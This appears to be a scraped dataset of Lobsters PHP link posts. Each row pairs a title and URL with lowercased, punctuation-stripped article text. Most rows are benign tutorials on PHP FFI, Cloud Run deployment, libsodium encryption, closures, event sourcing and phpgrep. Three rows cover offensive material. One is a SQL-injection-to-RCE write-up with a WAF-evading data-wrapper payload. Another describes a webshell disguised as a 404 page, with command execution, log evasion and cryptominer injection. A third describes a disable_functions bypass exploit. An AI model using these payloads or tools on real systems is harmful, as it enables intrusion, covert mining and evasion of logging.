59,Lobsters,php,PHP programming,PHP 7.4 FFI: What you need to know,https://jolicode.com/blog/php-7-4-ffi-what-you-need-to-know,php ffi need know,version en français ici php extension uuid generation pecl uuid extension github libuuid ffiuuid layer documentation http githubcomjolicodeffiuuid thought simplicity performance benchmark script conclude native extension replaced ffi uuid play ffi replace redis extension gitlib tensorflow tensorflow php language choose bind lib php bind rust lib php joel small library conclusion,nov lecture min auteur tag lira la version en français ici php foreign function interface ffi fan php extension allows include ease external library php code mean possible use c go rust etc shared library directly php without writing php extension c concept exists year language like python go uuid generation let start small example uuid generation php several way generate uuids best way use pecl uuid extension may read code github php extension take care binding php function libuuid make work must install libuuid system worry almost always case pecl happen call uuidcreate php userland code php code v v php engine v v uuid ext v v uuid lib ffi promise replace layer uuid extension pure php code talking php extension ffi layer need explain library library usually written c written many language able compile shared library c rust go etc unix linux library compiled file window dll file also possible statically include library binary chapter article context library code source h file contain library able extract uuidh file constant define uuidvariantncs define uuidvariantdce define uuidvariantmicrosoft define uuidvariantother function declaration void uuidgenerate uuidt int uuidcompare const uuidt const uuidt h file something similar php interface contains constant function signature ffiuuid layer order work ffi need function signature underlying library libuuid want use copy h file project sometimes may clean adapt file need example may remove function never use file look like define ffilib typedef unsigned char uuidt extern void uuidgeneratetime uuidt extern void uuidt const uuidt n const char name sizet len extern void uuidgeneraterandom uuidt extern void uuidt const uuidt n const char name sizet len important complex part code write done include file php code ffi ffi load dir includeuuidphph et voilà use libuuid directly php code easy wait minute libuuid work exactly like function expect typed argument may seen thesis function return uuid modify reference first argument need value calling function output ffi new uuidt output instance fficdata according internal type cdata access different value thanks different operator described documentation finally call function uuidgeneraterandom match name exposed library h file ffi uuidgeneraterandom output content output updated array decimal value compose uuid need convert array string hexadecimal value foreach output value uuid sprintf value like want bother reproducing made open source http thought simplicity binding external library really easy complicated part creation minimal h file map php type library viceversa performance also interesting look performance implementation repository find benchmark script result comparison implementation pecl ffi pecl see pecl twice faster implementation uuid faster uuid explain easily uuid composed pseudorandom data uuid contains many static bloc getting random data bit slow generation much slower difference implementation le visible almost time spent inside libuuid conclude ffi still really young even released writing expect performance improvement however already say native extension already exist install use extension exist ffi good candidate bottleneck application may interesting port bit code c rust etc bind ffi ffi become really interesting cpu bounded dom management big array complex calculation etc native extension replaced ffi really soon tell however extension like pdo much simple binding library pretty confident extension replaced ffi nonetheless extension may replaced case phpredis amqp uuid etc example remi collet already began play ffi replace redis extension ffi open door possible replace pure php library use low level library instead case gitlib could leverage ffi situation c extension pure php implementation ever try test tensorflow php know complicated dmitry stogov one important php core contributor also author phpffi created poc bind tensorflow php language choose bind lib php language able compile shared library systematically good bind php better use language without runtime c c rust runtime may side effect example go runtime garbage collector manage thread goroutines slow execution even break application bind rust lib php wanted try faster execute complex calculation another language php quite common extract piece html web page order test website crawling web joel made small library extract first html element document match cs expression code really short extent conversion rust type c type represents code php binding look like something similar uuid include directly source code ffi ffi cdef eoh const char cssfilter const char html const char filter eoh dir targetreleaselibcssfilterso usage even simpler value ffi cssfilter html selector performance really impressive encouraging ffi duration symfonycrawler duration easily conclude calculation complex might interesting port part php code another language order increase performance application conclusion ffi released yet already big fan ffi allow u try libs even binding exist yet allow u replace slow part code rust example implantation sure unlock idea yet
60,Lobsters,php,PHP programming,PHP 7.4 available,https://www.php.net/manual/en/migration74.php,php available,migrating php php table content,migrating php php table content user contributed note page
61,Lobsters,php,PHP programming,How to run Symfony on Google Cloud Run with the demo app [Step-by-step],https://geshan.com.np/blog/2019/11/how-to-run-symfony-on-google-cloud-run-with-the-demo-app-step-by-step-guide,run symfony google cloud run demo app stepbystep,popular power permission demo app google cloud run prerequisite docker credit laravel google cloud run step github go repo github click google cloud button choose correct setting google cloud cli happened dockerfile apache config google cloud run button repo conclusion laravel google cloud run,symfony without doubt one popular php framework amazing flexibility written applaudable modular fashion symfony component even power prominent framework like laravel running symfony bit tricky time especially permission cache log folder blog post demystifies running symfony demo app docker container hosting serverless google cloud runprerequisites done least one project symfony course comfortable php composer good working knowledge git githubknow fair bit docker maybe even multistage buildhave working google cloud account give credit free yr reason account post going detailed one like last one laravel google cloud run fairly new git docker please read abovementioned post thoroughlysteps going step repo hosted github opensource course might look insanely easy go detail step let get started go repo navigate opensource github repo easy step click google cloud button click run google cloud blue button shown choose correct setting google cloud cli given logged google account google cloud setup project click proceed might need wait bit thatchoose project choose project deploy applicationchoose region choose region deploy application usually choose wait container built deployed see process everything go fine google cloud shell see http url go order see symfony demo app running like one issue setup data saved click around add new post happens data saved sqlite file persisted new container get old file get data pushed reposo happened thing need consider automagic deployment symfony app let look happened symfony demo app dockerized look dockerfile apache config dockerfile us multistage build stage install dependency composer another one apache run applicationif want run locally run dockercompose go http required port needed google cloud runthanks google cloud run button cloud shell script automagic deploymentto make tutorial fork repo add button explore itconclusion running symfony entail tricky configuration dockerized version breeze run really believe google cloud run superior product know dockerize web app run port get amazing scalability unparallel ease make run written much longer guide run laravel google cloud run tooi would recommend cloud run pet project even production application
62,Lobsters,php,PHP programming,Set up Laravel 6 on Google Cloud Run step by step with Continuous Integration,https://geshan.com.np/blog/2019/10/get-laravel-6-running-on-google-cloud-run-step-by-step-with-ci,set laravel google cloud run step step continuous integration,soared feature google cloud run prerequisite credit cloud run great option beginner step deploy clone laravel new laravel project installation command test locally first create new github repo github action add repo push readme email protected running command github repo add full laravel open pr add docker dockercompose run app locally laravel google cloud run docker post email protected boil main thing deploy google cloud run google container registry gcloud hurray app working google cloud run pricing knative kubernetes tldr google cloud account http conclusion post symfony,laravel soared popularity last year laravel community even say laravel made writing php enjoyable pain laravel interesting new feature getting super scalableworking url application take hour day setting something like kubernetes huge task google cloud run shine get working http url containerized app minutesgoogle cloud run serverless fully managed google get super scale billing second http url domain mapping want run stateless container cloud run hand easiest way post detail get laravel app working google cloud run continuous integration ci prerequisite familiar phpcomposer aware laravel landed suppose know use git cliyour code hosted github cicd familiar githubknow fair bit docker maybe even multistage buildhave working google cloud account give credit free yr reason account cloud run great option beginner two reason mentioned belowlearn best practice software like docker cicdgetting basic going click button select thing wait min get working http url easier step deploy step set deploy laravel cloud clone laravel new laravel project start cloning laravel using composer laravel cli indicated official installation guide using composer get latest laravel command ran following command get latest laravel composer createproject preferdist laravellaravel test locally first run cd php artisan serve see working fine went http web browser php installed create new github repo create new repository github like use git hosting provider example using github action run test github popular git hosting add repo push readme repo created add local laravel copy push readme file thisrun following command cli git init code used v code change readme git add readmemd git commit initial commit app readme git remote add origin email protected git push u origin master running command github repo add full laravel open pr let add whole app pr github repo executing following command git checkout b add gitignoregit add git commit add whole laravel app git push origin go open pull request pr repo like one might thinking one working whydo need pr well always better thing methodically even one person working project merge pull requestnow fun part merged pr github know laravel project click action tab repo page able see something like click set workflow laravel next page click start commit button top right add commit message like click commit new filethere go ci setup laravel default test run git push nt easy thank github great intelligence creating mycinameyml file anymore add docker dockercompose run app locally let add docker dockercompose run app locally without php artisan serve need container run laravel google cloud run part inspired laravel google cloud run post nicolas want learn docker laravel please refer postrun following command first get master date added workflow file github interface git checkout master git fetch git pull rebase origin master added workflow file github interface git checkout b docker add key envexample file copy env file like appnamelaravel appenvlocal appdebugtrue appurlhttp localhost demo ok real app always careful secretsfor productionready apps turn debugging dev related thingsadd following dockerfile project root build workdir app copy app run composer global require hirakprestissimo composer install run dockerphpextinstall pdo pdomysql expose copy frombuild app varwww copy copy envexample varwwwenv run chmod r varwwwstorage echo listen chown r wwwdata wwwdata varwww rewrite add following file virtualhost serveradmin email protected documentroot varwwwpublic directory varwww allowoverride require granted directory errorlog apachelogdir errorlog customlog apachelogdir accesslog combined virtualhost add following dockercomposeymlversion service app build context volume varwww port environment appenvlocal boil main thing try understand everything might overwhelming let boil main part using official php apache docker image run laravel php version using multistage build get dependency composer copying main docker image php apacheas google cloud run requires webserver listening port using configure thisto make thing easy run single command dockercompose using dockercomposenow read far run dockercompose root everything run go http see laravel running locally docker dockercompose output towards end laravel running fine docker let open pr like one add docker project ran following command root project opening pull request pr git status give something like branch docker untracked file use git add file include committed dockerfile dockercomposeyml docker nothing added commit untracked file present use git add track run following command git add git commit add docker docker compose git push origin docker bonus run laravel default test push like see owner repo access action tab people nt necessarily need know result test build let deploy laravel setup google cloud run easy way given merged pr docker branch let run following command git checkout master git fetch git pull rebase origin master git checkout b cloudrunbutton add following readmemd file run google cloud run run google cloud http storagegoogleapiscomcloudrunbuttonsvg http consolecloudgooglecomcloudshelleditor shellonlytrue cloudshellimagegcriocloudrunbutton cloudshellgitrepohttps careful replace last part repo http url example repo http http commit push pr look something like deploy google cloud run merge pull request pr go repo page click run google cloud buttonafter given logged google account google cloud setup project click proceed might need wait bit thenchoose project choose project deploy applicationchoose region choose region deploy application usually go wait container built deployed see process everything go fine google cloud shell see http url hit see yourlaravel app running like happened choosing region script built docker container image dockerfile repothen pushed built image google container registryafter using gcloud cli deployed built image cloud run gave back hurray app working git url see app working google cloud run like want deploy another version merge pr master click button deploymore google cloud run pricing google cloud run generous run containerized app web app google cloud run ran pet project got request per minute pay anythingbehind scene using knative kubernetes also run kubernetes cluster would choose manage cluster push get scalableserverless fully managed app tldr run laravel google cloud run quickly follow step make sure logged google cloud accountgo http run google cloud blue buttonselect projectselect regionwait get url laravel app enjoy conclusion go running laravel app google cloud run pretty easy even got test running github github action hope help cicd approach check post show deployment using cloud build container running local production google cloud run environment nt need learn new framework go serverless try symfony google cloud runany containerized web app run google cloud run great service
63,Lobsters,php,PHP programming,Message Encryption in JavaScript and PHP with Libsodium,https://dev.to/paragonie/message-encryption-in-javascript-and-php-cg9,message encryption javascript php libsodium,never replace tl http javascript encryption sodiumplus latest release sodiumplus version php decryption sodium paragoniesodiumcompat putting together security consideration sodiumplus publickey encryption javascript congruent php function may want hire paragon initiative enterprise code audit reading,fun let encrypt stuff clientside javascript php server decrypt note never replace tl http javascript encryption sodiumplus want latest release sodiumplus writing version script src staticjssodiumplusminjs integrity script next want write javascript code encrypt message send server using jquery example easily adapt use xmlhttprequest object instead let define two function one load cryptographykey object hardcoded string nb never want actually sake easy working example using hardcoded secret actually encrypts message get example key real world want generate randomly async function getexamplekey windowsodium windowsodium await sodiumplusauto return cryptographykeyfrom hex return await sodiumcryptosecretboxkeygen encrypt message given key async function encryptmessage message key windowsodium windowsodium await sodiumplusauto let nonce await sodiumrandombytesbuf let encrypted await sodiumcryptosecretbox message nonce key return noncetostring hex encryptedtostring hex next want write function gather user input encrypts sends server async function sendencryptedmessage let key await getexamplekey let message userinput val let encrypted await encryptmessage message key post sendmessage message encrypted function response consolelog response output append li pre responsemessage pre li supporting html label userinput type message encrypt send label textarea id userinput textarea button id sendit type button send encrypted message button hr ol id output ol script type textjavascript sendit click sendencryptedmessage script php decryption sodium going want paragoniesodiumcompat using php overwhelming probability use built sodium function however distros may incorrectly disable sodium extension default play safe install sodiumcompat anyway using framework symfony laravel code look lot cleaner sake illustration decryption code look like php declare require vendorautoloadphp composer header contenttype applicationjson key encrypted post message null encrypted echo jsonencode message null error message provided jsonprettyprint exit nonce substr encrypted ciphertext substr encrypted plaintext sodiumcryptosecretboxopen ciphertext nonce key echo jsonencode message plaintext original encrypted jsonprettyprint putting together type message press button encrypt send hexencoded string server php code decrypt message return plaintext json response javascript code grab plaintext json response append output field form security consideration toy example illustrate use sodiumplus javascript libsodium php encryptdecrypt message took lot shortcut wo nt want take real system example hardcoding encryption key eschewing errorchecking favor brevity like something advanced publickey encryption javascript congruent php function documentation available free online shameless plug looking security expert review javascript php code check may want hire paragon initiative enterprise code audit reading
64,Lobsters,php,PHP programming,SQL injection to RCE,https://medium.com/bugbountywriteup/sql-injection-to-lfi-to-rce-536bed29a862,sql injection rce,experimented day ago working penetration testing open data security union type sql injection modsecurity apache module enabled bypassed php wrapper php index php try data wrapper php echo system uname php sy b stem c b c uname finally got rce,next line expose case experimented day ago working penetration testing one customer open data security opinion interest needed concatenate factor get rcefor obvious reason customer data anonymizeddoing directory fuzzing found folder php file inside http customercomphploadphpwhen tested url got php warning see app trying include empty filename php extension next thing came mind maybe could control filename get parameter decided bruteforce parameter recurring script thought test common old school website module parameter like sec section mod module file page etc surprise page parameter threw different error mysql warning message well see include function continues point empty filename see got mysql error tried guess aplication get required filename database tried usually sql inyection http customercomphploadphp page got include warning message time filename empty analyticsphp first path string point website cs style loaded link pink well time secure include get part path database need try union type sql injection control path try local file inclusionin first injection tried got response website modsecurity apache module enabled unfortunately detects injection know outdated modsecurity version bypassed mysql comment injection string tried worked column injected query http customercomphploadphp page select find anywhere else throughout web application upload form would allow upload image file extension php code wishfully could include exploit present local file inclusion see previous image observed could manipulate beginning path great perspective know try use php wrappersfirst used php wrapper read indexphp file http customercomphploadphp page select index php voila got encoded string indexphp source codeah point want get rce first tried input wrapper work application concatenates input rest path mighty modsecurity module use nullbyte possible decided try data wrapper send php code hopefully execute http customercomphploadphp page select data textplain php echo system uname got modsecurity response blocking thinking supposed problem system string went back cook php line php sy b stem c b c uname finally payload http customercomphploadphp page select data textplain php sy b stem c b c uname response command result finally got rce
65,Lobsters,php,PHP programming,CosasDePuma/SecurityNotFound,https://github.com/CosasDePuma/SecurityNotFound,cosasdepumasecuritynotfound,security found page found webshell clone installation access granted control panel banner button coinimp log footprint todo support developer scheme content,security found page found webshell clone clone download project git clone http githubcomcosasdepumasecuritynotfoundgit securitynotfound cd securitynotfound installation file located target server server must ability execute php file example common route server located window xampp c xampphtdocs linux varwwwhtml obviously know legitimate access server access granted access browser http replace server error template access invalid url access control panel press tab key search password field using browser tool default password cosasdepuma leave passphrase variable script empty string directly access control panel intention lost respect set custom value insert password passphrase variable applying algorithm three consecutive time control panel banner function shown picture current user root kernel linux release exit button also log using exit parameter get request button name function phpinfo show phpinfo page exploitdb search kernelcompatible exploit exploitdbcom geolocate show approximately google map place server physically located cryptominer add j cryptominer coinimp php html file folder body tag selfremove shell deletes server coinimpkey need set use crytominer function log footprint line accesslog action access without logging access session already started log log execute command console button phpinfo button exploitdb button geolocate button cryptominer button selfremove problem faviconico todo support developer everything publish used free whenever receive corresponding merit anyway want help direct way leave tip clicking badge scheme content securitynotfound repository license readmemd asset bannerjpg buttonsjpg consolejpg hidepasswdjpg notfoundjpg iconpng soruce code src
66,Lobsters,php,PHP programming,disable_functions Bypass Exploit in PHP 7.1 to PHP 7.3,https://github.com/mm0r1/exploits/tree/master/php-json-bypass,disablefunctions bypass exploit php php,file permalink php disablefunctions bypass check exploit us another bug work php version released vulnerability target cfreal reload reload,file permalink failed load latest commit information type name latest commit message commit time php disablefunctions bypass check exploit us another bug work php version released exploit utilises use free vulnerability json serializer order bypass disablefunctions execute system command fairly reliable work server apis although guaranteed target version date released may released may credit cfreal original bug discovery perform action time signed another tab window reload refresh session signed another tab window reload refresh session
67,Lobsters,php,PHP programming,"No, PHP Doesn't Have Closures",https://nullprogram.com/blog/2019/09/25/,php nt closure,badly designed anonymous function little tricky anonymous function closure clunky matlab nothing partial function evaluation method reference emacs lisp partial function application fairly recently monkey see monkey,september php programming language bizarre nothing else worthy anthropological study consistent property php badly designed yet somehow remains widely popular social dynamic play science yet unlock say hate php reason write program php never use expect ever need despite look away php way look away car accident recently came across link php manual morbid curiosity caused look fun pick arbitrary section manual see many crazy design choice spot least see sort strange terminology manual invented describe common concept time around one section anonymous function including closure even worse expected circumstance closure litmus test closure semantics complex subtle little tricky get hang interviewing candidate toss question two closure either familiar get right away unfamiliar get nothing right latter informative php fall clearly latter example closure manual demonstrates closure closing global variable told year php closure took claim face value fact php closure since released june decade late investigating however far tell nobody ever pointed php closure fact actually closure anonymous function closure getting closure let go work starting plain old anonymous function php anonymous function easy part function foo return function return function foo return function return php call returned function immediately like php syntax error well php parser clunky matlab welldesigned language expect could also closure close local variable function may continue access variable later example function bar n return function return n bar error undefined variable n fails must explicitly tell php variable intend access inside anonymous function use function bar n return function use n return n bar actually closed n would legitimate closure tell language exactly variable closed would pretty dumb still meet definition closure catch actually closing variable name listed use actually extra hidden parameter bound current value variable word nothing partial function evaluation function bar n f function use n return n n never used return f r bar r equivalent javascript using bind method function bar n let f function return return fbind null n actually powerful php closure since arbitrary expression used bound argument php limited couple specific form javascript proper closure instead rely bind nobody would claim javascript closure different php reference php reference binding reference anonymous function kinda sorta like closure still partial function evaluation argument reference tell reference capture actually closure work equally well global variable local variable still closing lexical environment binding reference parameter counter function bar n global counter f function use n counter counter return n n effect return f r bar r counter example difference n local variable counter global variable make sense closure close global variable emacs lisp partial function application emacs lisp famously get lexical scope therefore closure fairly recently still default dynamic scope oddball however long applypartially function partial function application return closurelike object language proper closure used create closure like php defun bar n applypartially lambda n work regardless lexical dynamic scope construct really closure like php closure php partial function evaluation built directly language special use syntax monkey see monkey shell command language use sigils built atop interactive command line usage bare word taken literally variable exception perl use sigils originally designed alternative shell script mimicked syntax php use sigils perl situation closure follows pattern come php designer see feature another language really understand purpose semantics attempt add feature php get disastrously wrong
69,Lobsters,php,PHP programming,Planning the technology stack for an Event Sourcing project,https://keith-mifsud.me/blog/planning-the-technology-stack-for-an-event-sourcing-project,planning technology stack event sourcing project,get started new event sourcing project plan infrastructure service event sourcing project get touch event store database enjoying reading article privacy policy friendly advice kafka mysql postgresql read model database mongodb application framework laravel lumen api access graphql local development environment workflow developing php application article issue kanban board docker container event sourcing running application http code structure directory structure enterprise system php command domain event exception handler listener repository specification exception projector read model repository namespacing enjoying reading article privacy policy testing tdd next time practical event sourcing subscribe follow twitter,common question encounter training consulting developer engineer software development laboratory new event sourcing project start question make much sense remember trying get head around object oriented programming practice crap learnt school let alone understanding domaindriven design almost decade ago building relatively complex online offline sale logistics system back day one largest client manufacturer wholesaler distributor industrial refrigeration airconditioning system three month project team set three software engineer two backend web developer one frontend developer making excellent progress building system using ddd model laravel application framework good productive client hired internal cto asked meet obliged asked working event sourcing php answer series question already knew event sourcing read book never ever needed implement thing know start mean idea knew concept theory itin previous article explained get started new event sourcing project theory event storming covered time start thinking equally important factor technology stack event sourcing projecti chose php primary backend programming language however confident planning factor apply programming language like use event sourcing project article outline consideration planning infrastructure application glue also describe provide working example local environment deployment code structure deem starting point system testing frameworkhow plan infrastructure service event sourcing projectarguably believe majority case working team preparing requirement depend several factor project stakeholder need although making decision project process similar team project commissioned client main difference choose backend service comfortable using nt external dependency beyond control migrating integrating data mssql database mysql database career equal number opportunity developing new system migrating legacy system event sourcing solution opinion latter lot complicated get touch need help refactoring legacy system use event sourcing pattern also migrate existing data intentionally kept example domain simple distract primary topic build event sourcing project practical example example code project sample commercial project manage please feel free ask question comment section business domain way let u start planning technology stack example project lot coverevent store databasethe critical persistent storage event sourcing event store database sure aware several different database engine use running event store comparing engine post need know need append optimised databasegiven immutable nature event sourcing certainly nt need update persisted event also nt need run complex read query mention future article event store implementation query persisted event identified aggregate uuid universally unique identifier quite simple queryare enjoying reading article subscribe receive email notification publish new article code librariesi share email address anyone unsubscribe timeview privacy policy informationi also would discourage implementing event store nosql database nt rule written ink okay use storage mechanism wish since believe event store schema explicitly declared nt see nosql good fit event store although emphasize still declare schema primary key database engine friendly advice nt use message broker kafka source persisted truth message broker precisely name implies broker even message stream cached logged message persisted elsewhere case chosen implement event store mysql database find postgresql also great event store implementation used several timeswith made first decision infrastructure listing application use mysql persisting event however segregate model code decision using repository pattern therefore change mind future need change implementation somehow migrate dataread model databasealthough used mysql persisting read model often implement nosql database read model favour flexibility nosql give applicationsi note application require read model explicitly declared schema listing application saying want point several version read model type decision dependant specific application anticorruption layer security listing application read model schemaless lack schema give flexibility adding field read model without make change existing data however taking approach need make sure read query handle missing field thus arbitrary data also note cost significant factor decision cloud service provider charge incoming outgoing traffic storage computing thus hosting multiple database separate instance affect traffic fee many different nosql database engine available make head spin try list even half using mongodb database read model system specific reason use lot daytoday work comfortable itapplication frameworkdo need application framework arguably nt need application layer accessed client user interface however also need essential component application layer particular order ability resolve concrete implementation dependency ability easily swap concrete implementation new one anticorruption layer incoming request model form identity authentication client user ability segregate configurable option using environment variable probably requirement bootstrapping whole thing course use bunch decoupled component together satisfy requirement done even successfully use framework laravel disadvantage course none con bad enough application laravel framework bootstrap time overhead nt see significant use decoupled component bootstrap together almost sure bootstrapping le efficient unless develop custom caching optimisation similar one already provided laravelyou might asking opting lumen microframework answer little dumb nt used lumen production nt experience know still need use eloquent laravel authentication system think significant component might reduce bootstrap time please correct wrong nt know much lumenapi accessi also intend use graphql query language api find graphql schemaless read model perfect match however probably result using even le laravel http layer example graphql type system serve anticorruption layer application layer opposed laravel request object using api also mean likely need develop graphql implementation currently afaik current library grapghql laravel use eloquent type system wo nt using eloquent read model defeat schemaless advantage much love development environmentwe ready planning technology stack listing application time prepare local development environment last year wrote article detailing workflow developing php application although continuously refactor process noticeable change almost always using docker development environment opposed vagrant focussing series article deployment strategy even distributed system implementing microservices approach although system may feel like monolith reality deploy every backend service separate machine run system kubernetes cluster needed merely following article going detail organised project task article detail article mentioned still valid summary followed step set local directory project mkdir p codekeithmifsudphpeventsourcingdemo cd codekeithmifsudphpeventsourcingdemo installed laravel directory named code composer createproject preferdist laravellaravel code probably best install laravel within docker since using ubuntu host nt matter initialised git added remote repository origin cd code git init git remote add origin git githubcom keithmifsudphpeventsourcingdemogit updated project description composerjson file deleted readmemd file provided laravel create new initial readmemd file describe purpose repository may also wish add license file done committed change pushed remote origin git add git commit initial commit containing laravel framework git push u origin masteri also created project issue kanban board github simple management technique help continue working project even away case project container event sourcingokay shared summary getting going task let get going docker container need event sourcing application already covered need mysql database event store mongodb database read model however want separate database application framework case laravel nt need separate database application layer choose several reason want able easily backup event store independently nt want laravel get anywhere close event store artisan migrate command fluffin scary also need docker container php runtime web server well serving web using dockercompose compose container follows version service esdemophpruntime build context dockerfile dockerphpdockerfile image digitaloceancomphp containername esdemophpruntime restart unlessstopped tty true environment servicename esdemophpruntime servicetags dev workingdir varwww volume varwww dockerconfigurationphplocalini usrlocaletcphpconfdlocalini network esdemonetwork esdemonginxwebserver image nginx alpine containername esdemonginxwebserver restart unlessstopped tty true port volume varwww dockerconfigurationnginxconfd etcnginxconfd network esdemonetwork esdemomysqlappdb image containername esdemomysqlappdb restart unlessstopped tty true port environment mysqldatabase esdemoapplicationdb mysqlrootpassword secret servicetags dev servicename esdemomysqlappdb volume dockerstorageappdata varlibmysql dockerconfigurationmysqlmycnf etcmysqlmycnf network esdemonetwork esdemomysqleventstoredb image containername esdemomysqleventstoredb restart unlessstopped tty true port environment mysqldatabase esdemoeventstoredb mysqlrootpassword secret servicetags dev servicename esdemomysqleventstoredb volume dockerstorageeventstoredata varlibmysql dockerconfigurationmysqlmycnf etcmysqlmycnf network esdemonetwork esdemomongoreadmodeldb image containername esdemomongoreadmodeldb restart unlessstopped tty true port environment mongoinitdbdatabase esdemoreadmodeldb mongoinitdbrootusername root mongoinitdbrootpassword secret servicename esdemomongoreadmodeldb servicetags dev volume dockerstoragereadmodeldata datadb network esdemonetwork network esdemonetwork driver bridge volume appdata driver local eventstoredata driver local readmodeldata driver localas see extracted php container docker file also added configuration file outside dockercompose file find file following along need create directory docker volume toomkdir p dockerstorageappdata mkdir dockerstorageeventstoredata mkdir dockerstoragereadmodeldatarunning applicationwe nt much see want u make sure running next part setting testing framework also ready following article let wake container either check application running visiting http even better phpunit exec esdemophpruntime php vendorbinphpunitat stage may wish configure env file database connection value wo nt nt need yet structureone pet peeve asked help team working project us laravel laravel beall endall laravel application framework symfony application framework say please verbose business app namespace say nothing problem solving solution providing customer nt solving complex business problem domain demo listing website similar gumtree still let change ambiguous app namespace reflect goalsdockercompose exec esdemophpruntime php artisan app name esdemoapplicationokies laravel simply application framework however entire system laravel provide access application use helper authentication application bootstrap also use eloquent persisting authentication requirement use eloquent either event store read model whether use eloquent different architecture domaindriven design ddd believe dbal model business model use dbal database abstraction layer enforce business rule end querying database every check even already exist memory rant create first step system structure application system thought said rant structure ddd model system code live src directory source directory namespaced esdemo system name subdirectory autoloaded standardmy directory structure enterprise system phpit early listing system anything living src directory never early explain structure directoriesi structure command model listing model following waycode app application stuff like laravel thing src infrastructure concrete implementation thing model listing command domain event exception handler listener repository specification listing read model detailed file structure extremely opinionated since common question wanted share notice nt directory separate command query model intentionally want model reflect business business querying listing bulk domain different business requirement listing singular model think pluralisation descriptive enoughdiving directory structure listing domain following directory following purpose command command way exterior layer access model domain directory includes business model object hold aggregate root sometimes entity also value object event think event directory outgoing information model exception possible exception spewed model everything abnormally yet possibly wrong handler command handler listener model listens event occurring model put listener repository data repository specification like use specification pattern specification object descriptive intent fellow engineer question directory reside inside domain directory choose keep outside layer reuse specification domain used factory also directory level access external layersi structure read model listing follows code application stuff like laravel thing src infrastructure concrete implementation thing model listing write model detailed listing exception projector readmodels repositoriesmy read model directory structure somewhat simpler command model although generic template le always includes following structure exception thing go wrong querying thing nt exist projector contains object listen event project read model read model read model example activelistings expiredlistings etc repository interface segregating concrete data implementation namespacingalthough nt anything src directory yet still set namespace composerjson add entry src directory autoload esdemoapplication app esdemo src please note using container composer therefore run composer dumpautoload inside docker run host however may wish either add container composer even keep composer installed php runtime container discourage pushing composer production server instead build docker image cd process namespace configuration easily follow system code structure intent throughout development listing application place model code inside srcmodels directory infrastructure code srcinfrastructure directorythe remaining code within application layer layer namespace contain application code case le coupled laravelin future article also see infrastructure layer structured implement repository concretely layer therefore directory structured accordingly follow business model structure domain infrastructure businessare enjoying reading article subscribe receive email notification publish new article code librariesi share email address anyone unsubscribe timeview privacy policy informationtestingas always approach development eventsourced application using tdd start setting initial directory structure test separate three different test suitesthese test suite unit test integration test feature test laravel ship example feature test another example unit test therefore need create directory integration test suite follows mkdir testsintegrationthen add entry phpunitxml test suite testsuite name integration directory suffix testphp testsintegration directory testsuite nt mind keep example test provided laravel unit test useful ensure test framework working feature test ensures homepage accessible however want change test namespace testsfeature esdemotestsfeature unit test testcases provided laraveltherefore update every instance test namespace esdemotests update composerjson file autoload test class autoloaddev esdemotests test refresh autoloaded classesand obviously make sure test passdockercompose exec esdemophpruntime vendorbinphpunitas go along tutorial show make use testing scenario class also developing testcases fit suite example unit test require application instance laravel testcase needlessly creates entire app every testuntil next timei want end article small note amount work involved working new event sourcing solution see article alone even planning technology stack example project seems extensive please nt fret planning take time take time planning involved implementing pattern enterprise application architecture nt think nt take time plan execute step article time spend containerised systemthe entire process covered article took le half hour including planning database framework use getting github set also setting local environment take amount time repeated process project also good refactor development process tool use overall strategy get thing done often neededin next article series practical event sourcing working common model common model contains object shared model importantly common model include component abstraction needed eventsourced domain subscribe want email publish follow twitter
70,Lobsters,php,PHP programming,25 Years of PHP (by the Creator of PHP),https://www.youtube.com/watch?v=wCZ5TJCBWMg,year php creator php,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature year php creator php youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature year php creator php youtube
71,Lobsters,php,PHP programming,"phpgrep: syntax-aware grep for PHP code, written in Go",https://github.com/quasilyte/phpgrep,phpgrep syntaxaware grep php code written go,phpgrep phpgrepcontrib overview structural search replace githubcommvdangogrep phpgrep syntax aware code search quick start vscodephpgrep latest release single equal pattern language doc recipe useful recipe miscellaneous recipe install source,phpgrep syntaxaware grep php code repository used library commandline tool development good source additional utility readytorun recipe phpgrepcontrib repository overview phpgrep library commandline tool library used perform syntaxaware php code matching inside go program binary utility used favorite text editor terminal emulator close structural search replace phpstorm better suited standalone usage many way inspired githubcommvdangogrep see also phpgrep syntax aware code search quick start using v code might interested vscodephpgrep extension download phpgrep binary latest release put somewhere path run help command verify everything okay phpgrep help usage phpgrep flag target pattern filter flag commandline flag listed help see target file directory name search performed pattern string describes matched filter optional argument bound pattern example find f call single variable argument phpgrep filephp f var like previous example search inside entire directory recursively variable name restricted id uid gid also us v flag make phpgrep output info phpgrep v codephp f x var xid uid gid exit status something matched nothing matched error occured rest output create test file hellophp php function f x f f f f x f run phpgrep file phpgrep hellophp f x int x f f found f call single argument x int literal equal next thing learn matcher suppose need match foo function call null argument foo variadic unknown argument located pattern match null argument position foo null read pattern language doc learn write search pattern recipe section contains readytouse phpgrep pattern srcdir target source directory also single filename useful recipe find array least duplicated key phpgrep srcdir k k find x applied phpgrep srcdir x x use x instead find x applied phpgrep srcdir isset x x find inarray call replaced x phpgrep srcdir inarray x find potential operator precedence issue phpgrep srcdir x mask x mask phpgrep srcdir x mask x mask find call func args misplaced phpgrep srcdir stripos str phpgrep srcdir explode str find new call without parenthesis phpgrep srcdir new find statement body without phpgrep srcdir cond x x without regexp phpgrep srcdir code expr find errorsupress operator usage phpgrep srcdir find nonstrict comparison null phpgrep srcdir null miscellaneous recipe find function call least one varargument id suffix phpgrep srcdir f x var x id find foo call second argument integer literal phpgrep srcdir foo int install source need go tool install phpgrep source install phpgrep binary go env gopath bin go get v githubcomquasilytephpgrepcmdphpgrep gopathbin system path phpgrep command available
